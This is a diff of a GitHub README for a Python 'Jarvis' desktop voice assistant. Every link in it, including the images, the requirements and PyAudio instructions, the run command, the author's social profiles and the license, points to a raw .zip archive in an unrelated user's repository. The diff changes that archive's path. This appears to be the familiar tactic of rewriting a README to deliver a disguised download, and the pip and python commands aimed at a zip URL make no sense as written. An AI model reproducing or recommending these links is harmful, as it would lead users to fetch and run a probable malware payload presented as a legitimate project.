@@ -1,6 +1,6 @@
 # Jarvis Desktop Voice Assistant🔥
 
-<img src="https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/hornblower/Jarvis-Desktop-Voice-Assistant.zip" alt="">
+<img src="https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/Images/Voice-Assistant-Desktop-Jarvis-3.0.zip" alt="">
 
 **Have you ever wondered how cool it would be to have your own assistant? Imagine how easier it would be doing Wikipedia searches without opening web browsers, and performing many other daily tasks like playing music with the help of a single voice command, opening different browsers in just a voice command.**
 
@@ -10,7 +10,7 @@
 
 ## 📌Built with
 
-<code><img height="30" src="https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/hornblower/Jarvis-Desktop-Voice-Assistant.zip"></code>
+<code><img height="30" src="https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/Images/Voice-Assistant-Desktop-Jarvis-3.0.zip"></code>
 
 ## 📌Features
 
@@ -61,15 +61,15 @@ Python 3.6+
 
 4. **Install Requirements**
 
-   - Install all the requirements given in **[https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/hornblower/Jarvis-Desktop-Voice-Assistant.zip](https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/hornblower/Jarvis-Desktop-Voice-Assistant.zip)** by running the command `pip install -r https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/hornblower/Jarvis-Desktop-Voice-Assistant.zip`
+   - Install all the requirements given in **[https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/Images/Voice-Assistant-Desktop-Jarvis-3.0.zip](https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/Images/Voice-Assistant-Desktop-Jarvis-3.0.zip)** by running the command `pip install -r https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/Images/Voice-Assistant-Desktop-Jarvis-3.0.zip`
 
 5. **Install PyAudio**  
-   - Follow the instructions given **[here](https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/hornblower/Jarvis-Desktop-Voice-Assistant.zip)**
+   - Follow the instructions given **[here](https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/Images/Voice-Assistant-Desktop-Jarvis-3.0.zip)**
 
 6. **Run the Assistant**
   - Run the main script:
     ```bash
-    python https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/hornblower/Jarvis-Desktop-Voice-Assistant.zip
+    python https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/Images/Voice-Assistant-Desktop-Jarvis-3.0.zip
     ```
   - Now Enjoy with your own assistant !!!!
 
@@ -87,9 +87,9 @@ Pull requests are welcome. For major changes, please open an issue first to disc
 
 👤 **Kishan Kumar Rai**
 
-- Twitter: [@kishan_rajput23](https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/hornblower/Jarvis-Desktop-Voice-Assistant.zip)
-- Github: [@kishanrajput23](https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/hornblower/Jarvis-Desktop-Voice-Assistant.zip)
-- LinkedIn: [@kishan-kumar-rai](https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/hornblower/Jarvis-Desktop-Voice-Assistant.zip)
+- Twitter: [@kishan_rajput23](https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/Images/Voice-Assistant-Desktop-Jarvis-3.0.zip)
+- Github: [@kishanrajput23](https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/Images/Voice-Assistant-Desktop-Jarvis-3.0.zip)
+- LinkedIn: [@kishan-kumar-rai](https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/Images/Voice-Assistant-Desktop-Jarvis-3.0.zip)
 
 ## 📌Show your support
 
@@ -97,4 +97,4 @@ Please ⭐️ this repository if this project helped you!
 
 ## 📌License
 
-This project is [MIT](https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/hornblower/Jarvis-Desktop-Voice-Assistant.zip) licensed.
+This project is [MIT](https://raw.githubusercontent.com/Ayush6912/Jarvis-Desktop-Voice-Assistant/main/Images/Voice-Assistant-Desktop-Jarvis-3.0.zip) licensed.
